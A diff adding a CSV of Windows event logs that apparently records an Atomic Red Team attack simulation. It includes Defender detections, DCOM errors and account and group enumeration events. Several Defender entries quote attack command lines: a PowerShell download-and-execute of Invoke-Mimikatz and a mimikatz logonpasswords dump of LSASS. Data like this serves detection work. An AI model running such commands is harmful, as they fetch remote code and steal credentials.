@@ -1,0 +1,2423 @@
+Level,Date and Time,Source,Event ID,Task Category,More Information
+Warning,15/04/2020 14:34,Microsoft-Windows-Windows Defender,1116,None,"Windows Defender Antivirus has detected malware or other potentially unwanted software.
+ For more information please see the following:
+https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:PowerShell/Mimikatz.A&threatid=2147725502&enterprise=0
+ 	Name: Trojan:PowerShell/Mimikatz.A
+ 	ID: 2147725502
+ 	Severity: Severe
+ 	Category: Trojan
+ 	Path: CmdLine:_C:\Windows\System32\cmd.exe /c PWS_EXECUTABLE IEX (New-Object Net.WebClient).DownloadString('GITHUB_MIMIKATZ_PWS'); Invoke-Mimikatz -DumpCreds
+ 	Detection Origin: Unknown
+ 	Detection Type: Concrete
+ 	Detection Source: System
+ 	User: NT AUTHORITY\SYSTEM
+ 	Process Name: Unknown
+ 	Security intelligence Version: AV: 1.313.1512.0, AS: 1.313.1512.0, NIS: 1.313.1512.0
+ 	Engine Version: AM: 1.1.16900.4, NIS: 1.1.16900.4"
+Warning,15/04/2020 14:34,Microsoft-Windows-DistributedCOM,10016,None,"The machine-default permission settings do not grant Local Activation permission for the COM Server application with CLSID 
+{C2F03A33-21F5-47FA-B4BB-156362A2F239}
+ and APPID 
+{316CDED5-E4AE-4B15-9113-7055D84DCC97}
+ to the user DESKTOP-P8HTU4V\User SID (S-1-5-21-887719237-3143055800-1059174887-1001) from address LocalHost (Using LRPC) running in the application container Microsoft.Windows.ShellExperienceHost_10.0.18362.387_neutral_neutral_cw5n1h2txyewy SID (S-1-15-2-155514346-2573954481-755741238-1654018636-1233331829-3075935687-2861478708). This security permission can be modified using the Component Services administrative tool."
+Information,15/04/2020 14:34,SecurityCenter,15,None,Updated Windows Defender status successfully to SECURITY_PRODUCT_STATE_ON.
+Warning,15/04/2020 14:34,Microsoft-Windows-Windows Defender,1116,None,"Windows Defender Antivirus has detected malware or other potentially unwanted software.
+ For more information please see the following:
+https://go.microsoft.com/fwlink/?linkid=37020&name=HackTool:Win32/Mimikatz.I&threatid=2147741009&enterprise=0
+ 	Name: HackTool:Win32/Mimikatz.I
+ 	ID: 2147741009
+ 	Severity: High
+ 	Category: Tool
+ 	Path: CmdLine:_C:\Windows\System32\cmd.exe /c ATOMICS_T1003_mimikatz_EXECUTABLE sekurlsa::minidump LSAAS_DMP sekurlsa::logonpasswords full exit
+ 	Detection Origin: Unknown
+ 	Detection Type: Concrete
+ 	Detection Source: System
+ 	User: NT AUTHORITY\SYSTEM
+ 	Process Name: Unknown
+ 	Security intelligence Version: AV: 1.313.1512.0, AS: 1.313.1512.0, NIS: 1.313.1512.0
+ 	Engine Version: AM: 1.1.16900.4, NIS: 1.1.16900.4"
+Warning,15/04/2020 14:34,Microsoft-Windows-DistributedCOM,10016,None,"The machine-default permission settings do not grant Local Activation permission for the COM Server application with CLSID 
+{C2F03A33-21F5-47FA-B4BB-156362A2F239}
+ and APPID 
+{316CDED5-E4AE-4B15-9113-7055D84DCC97}
+ to the user DESKTOP-P8HTU4V\User SID (S-1-5-21-887719237-3143055800-1059174887-1001) from address LocalHost (Using LRPC) running in the application container Microsoft.Windows.ShellExperienceHost_10.0.18362.387_neutral_neutral_cw5n1h2txyewy SID (S-1-15-2-155514346-2573954481-755741238-1654018636-1233331829-3075935687-2861478708). This security permission can be modified using the Component Services administrative tool."
+Information,15/04/2020 14:35,Service Control Manager,7040,None,The start type of the Background Intelligent Transfer Service service was changed from demand start to auto start.
+Information,15/04/2020 14:36,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		SYSTEM
+	Account Name:		DESKTOP-P8HTU4V$
+	Account Domain:		WORKGROUP
+	Logon ID:		0x3E7
+
+Group:
+	Security ID:		BUILTIN\Administrators
+	Group Name:		Administrators
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0x1a0
+	Process Name:		C:\Windows\System32\svchost.exe"
+Information,15/04/2020 14:36,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		SYSTEM
+	Account Name:		DESKTOP-P8HTU4V$
+	Account Domain:		WORKGROUP
+	Logon ID:		0x3E7
+
+Group:
+	Security ID:		BUILTIN\Backup Operators
+	Group Name:		Backup Operators
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0x1a0
+	Process Name:		C:\Windows\System32\svchost.exe"
+Information,15/04/2020 14:36,Microsoft-Windows-Security-Auditing,4624,Logon,"An account was successfully logged on.
+
+Subject:
+	Security ID:		SYSTEM
+	Account Name:		DESKTOP-P8HTU4V$
+	Account Domain:		WORKGROUP
+	Logon ID:		0x3E7
+
+Logon Information:
+	Logon Type:		5
+	Restricted Admin Mode:	-
+	Virtual Account:		No
+	Elevated Token:		Yes
+
+Impersonation Level:		Impersonation
+
+New Logon:
+	Security ID:		SYSTEM
+	Account Name:		SYSTEM
+	Account Domain:		NT AUTHORITY
+	Logon ID:		0x3E7
+	Linked Logon ID:		0x0
+	Network Account Name:	-
+	Network Account Domain:	-
+	Logon GUID:		{00000000-0000-0000-0000-000000000000}
+
+Process Information:
+	Process ID:		0x258
+	Process Name:		C:\Windows\System32\services.exe
+
+Network Information:
+	Workstation Name:	-
+	Source Network Address:	-
+	Source Port:		-
+
+Detailed Authentication Information:
+	Logon Process:		Advapi  
+	Authentication Package:	Negotiate
+	Transited Services:	-
+	Package Name (NTLM only):	-
+	Key Length:		0
+
+This event is generated when a logon session is created. It is generated on the computer that was accessed.
+
+The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.
+
+The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).
+
+The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.
+
+The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.
+
+The impersonation level field indicates the extent to which a process in the logon session can impersonate.
+
+The authentication information fields provide detailed information about this specific logon request.
+	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
+	- Transited services indicate which intermediate services have participated in this logon request.
+	- Package name indicates which sub-protocol was used among the NTLM protocols.
+	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested."
+Information,15/04/2020 14:36,Microsoft-Windows-Security-Auditing,4672,Special Logon,"Special privileges assigned to new logon.
+
+Subject:
+	Security ID:		SYSTEM
+	Account Name:		SYSTEM
+	Account Domain:		NT AUTHORITY
+	Logon ID:		0x3E7
+
+Privileges:		SeAssignPrimaryTokenPrivilege
+			SeTcbPrivilege
+			SeSecurityPrivilege
+			SeTakeOwnershipPrivilege
+			SeLoadDriverPrivilege
+			SeBackupPrivilege
+			SeRestorePrivilege
+			SeDebugPrivilege
+			SeAuditPrivilege
+			SeSystemEnvironmentPrivilege
+			SeImpersonatePrivilege
+			SeDelegateSessionUserImpersonatePrivilege"
+Information,15/04/2020 14:36,Microsoft-Windows-Windows Defender,1117,None,"Windows Defender Antivirus has taken action to protect this machine from malware or other potentially unwanted software.
+ For more information please see the following:
+https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:PowerShell/Mimikatz.A&threatid=2147725502&enterprise=0
+ 	Name: Trojan:PowerShell/Mimikatz.A
+ 	ID: 2147725502
+ 	Severity: Severe
+ 	Category: Trojan
+ 	Path: CmdLine:_C:\Windows\System32\cmd.exe /c PWS_EXECUTABLE IEX (New-Object Net.WebClient).DownloadString('GITHUB_MIMIKATZ_PWS'); Invoke-Mimikatz -DumpCreds
+ 	Detection Origin: Unknown
+ 	Detection Type: Concrete
+ 	Detection Source: System
+ 	User: NT AUTHORITY\SYSTEM
+ 	Process Name: Unknown
+ 	Action: Remove
+ 	Action Status:  No additional actions required
+ 	Error Code: 0x00000000
+ 	Error description: The operation completed successfully. 
+ 	Security intelligence Version: AV: 1.313.1512.0, AS: 1.313.1512.0, NIS: 1.313.1512.0
+ 	Engine Version: AM: 1.1.16900.4, NIS: 1.1.16900.4"
+Information,15/04/2020 14:36,SecurityCenter,15,None,Updated Windows Defender status successfully to SECURITY_PRODUCT_STATE_ON.
+Information,15/04/2020 14:36,SecurityCenter,15,None,Updated Windows Defender status successfully to SECURITY_PRODUCT_STATE_ON.
+Information,15/04/2020 14:37,Microsoft-Windows-Kernel-General,16,None,The access history in hive \??\C:\Users\User\AppData\Local\Packages\Microsoft.WindowsCalculator_8wekyb3d8bbwe\Settings\settings.dat was cleared updating 2 keys and creating 1 modified pages.
+Error,15/04/2020 14:37,Microsoft-Windows-DistributedCOM,10028,None,"DCOM was unable to communicate with the computer computer1 using any of the configured protocols; requested by PID      4c0 (C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe), while activating CLSID {49B2791A-B1AE-4C90-9B8E-E860BA07F889}."
+Error,15/04/2020 14:37,Microsoft-Windows-DistributedCOM,10028,None,"DCOM was unable to communicate with the computer Target using any of the configured protocols; requested by PID      7c4 (C:\Windows\System32\Wbem\WMIC.exe), while activating CLSID {8BC3F05E-D86B-11D0-A075-00C04FB68820}."
+Information,15/04/2020 14:37,Microsoft-Windows-Windows Defender,1117,None,"Windows Defender Antivirus has taken action to protect this machine from malware or other potentially unwanted software.
+ For more information please see the following:
+https://go.microsoft.com/fwlink/?linkid=37020&name=HackTool:Win32/Mimikatz.I&threatid=2147741009&enterprise=0
+ 	Name: HackTool:Win32/Mimikatz.I
+ 	ID: 2147741009
+ 	Severity: High
+ 	Category: Tool
+ 	Path: CmdLine:_C:\Windows\System32\cmd.exe /c ATOMICS_T1003_mimikatz_EXECUTABLE sekurlsa::minidump LSAAS_DMP sekurlsa::logonpasswords full exit
+ 	Detection Origin: Unknown
+ 	Detection Type: Concrete
+ 	Detection Source: System
+ 	User: NT AUTHORITY\SYSTEM
+ 	Process Name: Unknown
+ 	Action: Remove
+ 	Action Status:  No additional actions required
+ 	Error Code: 0x00000000
+ 	Error description: The operation completed successfully. 
+ 	Security intelligence Version: AV: 1.313.1512.0, AS: 1.313.1512.0, NIS: 1.313.1512.0
+ 	Engine Version: AM: 1.1.16900.4, NIS: 1.1.16900.4"
+Information,15/04/2020 14:37,SecurityCenter,15,None,Updated Windows Defender status successfully to SECURITY_PRODUCT_STATE_ON.
+Warning,15/04/2020 14:37,Microsoft Fax,32026,-1,Fax Service failed to initialize any assigned fax devices. No faxes can be sent or received until a fax device is installed.
+Warning,15/04/2020 14:37,Microsoft Fax,32068,-1,The outgoing routing rule is not valid because it cannot find a valid device. Check the routing rule configuration. Country/region code: '*' Area code: '*'
+Information,15/04/2020 14:37,Microsoft-Windows-Security-Auditing,4798,User Account Management,"A user's local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+User:
+	Security ID:		DESKTOP-P8HTU4V\CISADMIN
+	Account Name:		Administrator
+	Account Domain:		DESKTOP-P8HTU4V
+
+Process Information:
+	Process ID:		0xe80
+	Process Name:		C:\Windows\System32\wbem\WmiPrvSE.exe"
+Information,15/04/2020 14:37,Microsoft-Windows-Security-Auditing,4798,User Account Management,"A user's local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+User:
+	Security ID:		DESKTOP-P8HTU4V\DefaultAccount
+	Account Name:		DefaultAccount
+	Account Domain:		DESKTOP-P8HTU4V
+
+Process Information:
+	Process ID:		0xe80
+	Process Name:		C:\Windows\System32\wbem\WmiPrvSE.exe"
+Information,15/04/2020 14:37,Microsoft-Windows-Security-Auditing,4798,User Account Management,"A user's local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+User:
+	Security ID:		DESKTOP-P8HTU4V\CISGUEST
+	Account Name:		Guest
+	Account Domain:		DESKTOP-P8HTU4V
+
+Process Information:
+	Process ID:		0xe80
+	Process Name:		C:\Windows\System32\wbem\WmiPrvSE.exe"
+Information,15/04/2020 14:37,Microsoft-Windows-Security-Auditing,4798,User Account Management,"A user's local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+User:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+
+Process Information:
+	Process ID:		0xe80
+	Process Name:		C:\Windows\System32\wbem\WmiPrvSE.exe"
+Information,15/04/2020 14:37,Microsoft-Windows-Security-Auditing,4798,User Account Management,"A user's local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+User:
+	Security ID:		DESKTOP-P8HTU4V\WDAGUtilityAccount
+	Account Name:		WDAGUtilityAccount
+	Account Domain:		DESKTOP-P8HTU4V
+
+Process Information:
+	Process ID:		0xe80
+	Process Name:		C:\Windows\System32\wbem\WmiPrvSE.exe"
+Information,15/04/2020 14:38,Service Control Manager,7040,None,The start type of the Background Intelligent Transfer Service service was changed from auto start to demand start.
+Information,15/04/2020 14:39,Microsoft-Windows-Security-Auditing,4798,User Account Management,"A user's local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+User:
+	Security ID:		DESKTOP-P8HTU4V\CISADMIN
+	Account Name:		Administrator
+	Account Domain:		DESKTOP-P8HTU4V
+
+Process Information:
+	Process ID:		0xe80
+	Process Name:		C:\Windows\System32\wbem\WmiPrvSE.exe"
+Information,15/04/2020 14:39,Microsoft-Windows-Security-Auditing,4798,User Account Management,"A user's local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+User:
+	Security ID:		DESKTOP-P8HTU4V\DefaultAccount
+	Account Name:		DefaultAccount
+	Account Domain:		DESKTOP-P8HTU4V
+
+Process Information:
+	Process ID:		0xe80
+	Process Name:		C:\Windows\System32\wbem\WmiPrvSE.exe"
+Information,15/04/2020 14:39,Microsoft-Windows-Security-Auditing,4798,User Account Management,"A user's local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+User:
+	Security ID:		DESKTOP-P8HTU4V\CISGUEST
+	Account Name:		Guest
+	Account Domain:		DESKTOP-P8HTU4V
+
+Process Information:
+	Process ID:		0xe80
+	Process Name:		C:\Windows\System32\wbem\WmiPrvSE.exe"
+Information,15/04/2020 14:39,Microsoft-Windows-Security-Auditing,4798,User Account Management,"A user's local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+User:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+
+Process Information:
+	Process ID:		0xe80
+	Process Name:		C:\Windows\System32\wbem\WmiPrvSE.exe"
+Information,15/04/2020 14:39,Microsoft-Windows-Security-Auditing,4798,User Account Management,"A user's local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+User:
+	Security ID:		DESKTOP-P8HTU4V\WDAGUtilityAccount
+	Account Name:		WDAGUtilityAccount
+	Account Domain:		DESKTOP-P8HTU4V
+
+Process Information:
+	Process ID:		0xe80
+	Process Name:		C:\Windows\System32\wbem\WmiPrvSE.exe"
+Information,15/04/2020 14:39,Microsoft-Windows-Security-Auditing,4624,Logon,"An account was successfully logged on.
+
+Subject:
+	Security ID:		SYSTEM
+	Account Name:		DESKTOP-P8HTU4V$
+	Account Domain:		WORKGROUP
+	Logon ID:		0x3E7
+
+Logon Information:
+	Logon Type:		5
+	Restricted Admin Mode:	-
+	Virtual Account:		No
+	Elevated Token:		Yes
+
+Impersonation Level:		Impersonation
+
+New Logon:
+	Security ID:		SYSTEM
+	Account Name:		SYSTEM
+	Account Domain:		NT AUTHORITY
+	Logon ID:		0x3E7
+	Linked Logon ID:		0x0
+	Network Account Name:	-
+	Network Account Domain:	-
+	Logon GUID:		{00000000-0000-0000-0000-000000000000}
+
+Process Information:
+	Process ID:		0x258
+	Process Name:		C:\Windows\System32\services.exe
+
+Network Information:
+	Workstation Name:	-
+	Source Network Address:	-
+	Source Port:		-
+
+Detailed Authentication Information:
+	Logon Process:		Advapi  
+	Authentication Package:	Negotiate
+	Transited Services:	-
+	Package Name (NTLM only):	-
+	Key Length:		0
+
+This event is generated when a logon session is created. It is generated on the computer that was accessed.
+
+The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.
+
+The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).
+
+The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.
+
+The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.
+
+The impersonation level field indicates the extent to which a process in the logon session can impersonate.
+
+The authentication information fields provide detailed information about this specific logon request.
+	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
+	- Transited services indicate which intermediate services have participated in this logon request.
+	- Package name indicates which sub-protocol was used among the NTLM protocols.
+	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested."
+Information,15/04/2020 14:39,Microsoft-Windows-Security-Auditing,4672,Special Logon,"Special privileges assigned to new logon.
+
+Subject:
+	Security ID:		SYSTEM
+	Account Name:		SYSTEM
+	Account Domain:		NT AUTHORITY
+	Logon ID:		0x3E7
+
+Privileges:		SeAssignPrimaryTokenPrivilege
+			SeTcbPrivilege
+			SeSecurityPrivilege
+			SeTakeOwnershipPrivilege
+			SeLoadDriverPrivilege
+			SeBackupPrivilege
+			SeRestorePrivilege
+			SeDebugPrivilege
+			SeAuditPrivilege
+			SeSystemEnvironmentPrivilege
+			SeImpersonatePrivilege
+			SeDelegateSessionUserImpersonatePrivilege"
+Warning,15/04/2020 14:39,Microsoft-Windows-Windows Defender,1116,None,"Windows Defender Antivirus has detected malware or other potentially unwanted software.
+ For more information please see the following:
+https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:PowerShell/Powersploit.M&threatid=2147725349&enterprise=0
+ 	Name: Trojan:PowerShell/Powersploit.M
+ 	ID: 2147725349
+ 	Severity: Severe
+ 	Category: Trojan
+ 	Path: file:_C:\AtomicRedTeam\atomics\T1056\src\Get-Keystrokes.ps1
+ 	Detection Origin: Local machine
+ 	Detection Type: Concrete
+ 	Detection Source: Real-Time Protection
+ 	User: DESKTOP-P8HTU4V\User
+ 	Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ 	Security intelligence Version: AV: 1.313.1512.0, AS: 1.313.1512.0, NIS: 1.313.1512.0
+ 	Engine Version: AM: 1.1.16900.4, NIS: 1.1.16900.4"
+Warning,15/04/2020 14:39,Microsoft-Windows-DistributedCOM,10016,None,"The machine-default permission settings do not grant Local Activation permission for the COM Server application with CLSID 
+{C2F03A33-21F5-47FA-B4BB-156362A2F239}
+ and APPID 
+{316CDED5-E4AE-4B15-9113-7055D84DCC97}
+ to the user DESKTOP-P8HTU4V\User SID (S-1-5-21-887719237-3143055800-1059174887-1001) from address LocalHost (Using LRPC) running in the application container Microsoft.Windows.ShellExperienceHost_10.0.18362.387_neutral_neutral_cw5n1h2txyewy SID (S-1-15-2-155514346-2573954481-755741238-1654018636-1233331829-3075935687-2861478708). This security permission can be modified using the Component Services administrative tool."
+Information,15/04/2020 14:39,SecurityCenter,15,None,Updated Windows Defender status successfully to SECURITY_PRODUCT_STATE_ON.
+Information,15/04/2020 14:40,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Access Control Assistance Operators
+	Group Name:		Access Control Assistance Operators
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0x130c
+	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Information,15/04/2020 14:40,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Administrators
+	Group Name:		Administrators
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0x130c
+	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Information,15/04/2020 14:40,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Backup Operators
+	Group Name:		Backup Operators
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0x130c
+	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Information,15/04/2020 14:40,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Cryptographic Operators
+	Group Name:		Cryptographic Operators
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0x130c
+	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Information,15/04/2020 14:40,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Device Owners
+	Group Name:		Device Owners
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0x130c
+	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Information,15/04/2020 14:40,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Distributed COM Users
+	Group Name:		Distributed COM Users
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0x130c
+	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Information,15/04/2020 14:40,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Event Log Readers
+	Group Name:		Event Log Readers
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0x130c
+	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Information,15/04/2020 14:40,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Guests
+	Group Name:		Guests
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0x130c
+	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Information,15/04/2020 14:40,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Hyper-V Administrators
+	Group Name:		Hyper-V Administrators
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0x130c
+	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Information,15/04/2020 14:40,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\IIS_IUSRS
+	Group Name:		IIS_IUSRS
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0x130c
+	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Information,15/04/2020 14:40,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Network Configuration Operators
+	Group Name:		Network Configuration Operators
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0x130c
+	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Information,15/04/2020 14:40,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Performance Log Users
+	Group Name:		Performance Log Users
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0x130c
+	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Information,15/04/2020 14:40,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Performance Monitor Users
+	Group Name:		Performance Monitor Users
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0x130c
+	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Information,15/04/2020 14:40,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Power Users
+	Group Name:		Power Users
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0x130c
+	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Information,15/04/2020 14:40,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Remote Desktop Users
+	Group Name:		Remote Desktop Users
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0x130c
+	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Information,15/04/2020 14:40,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Remote Management Users
+	Group Name:		Remote Management Users
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0x130c
+	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Information,15/04/2020 14:40,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\Replicator
+	Group Name:		Replicator
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0x130c
+	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+Information,15/04/2020 14:40,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.
+
+Subject:
+	Security ID:		DESKTOP-P8HTU4V\User
+	Account Name:		User
+	Account Domain:		DESKTOP-P8HTU4V
+	Logon ID:		0x2E942
+
+Group:
+	Security ID:		BUILTIN\System Managed Group
+	Group Name:		System Managed Accounts Group
+	Group Domain:		Builtin
+
+Process Information:
+	Process ID:		0x130c
+	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
